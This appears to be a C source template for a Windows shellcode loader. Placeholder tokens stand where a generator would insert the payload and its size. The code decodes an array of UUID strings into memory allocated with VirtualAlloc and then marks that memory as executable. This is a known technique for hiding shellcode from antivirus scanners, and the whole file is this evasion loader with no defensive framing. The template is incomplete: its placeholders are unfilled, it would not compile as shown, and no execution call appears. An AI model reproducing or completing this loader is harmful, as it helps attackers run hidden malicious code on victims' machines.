#include <windows.h>
#include <rpc.h>
#pragma comment(lib,"Rpcrt4.lib")

###PAYLOAD###

const payloadSz = ###SIZE###;

LPVOID WriteUuidToMem()
{
    int uuid_len = 16;
    LPVOID pAddress = VirtualAlloc(NULL, payloadSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL)
    {
        return (LPVOID)NULL;
    }
    DWORD_PTR hptr = (DWORD_PTR)pAddress;
    DWORD lpflOldProtect = 0;

    int elems = sizeof(payload) / sizeof(payload[0]);
    for (int i = 0; i < elems; i++)
    {
        RPC_CSTR StringUuid = (RPC_CSTR)payload[i];
        UUID* Uuid = (UUID*)hptr;
        RPC_STATUS status = UuidFromStringA(StringUuid, Uuid);
        if (status != RPC_S_OK)
        {
            return (LPVOID)NULL;
        }
        hptr += uuid_len;
    }

    if (VirtualProtect(pAddress, payloadSz, PAGE_EXECUTE_READ, &lpflOldProtect))
    {
        return pAddress;
    }
    else
    {
        return (LPVOID)pAddress;
    }
}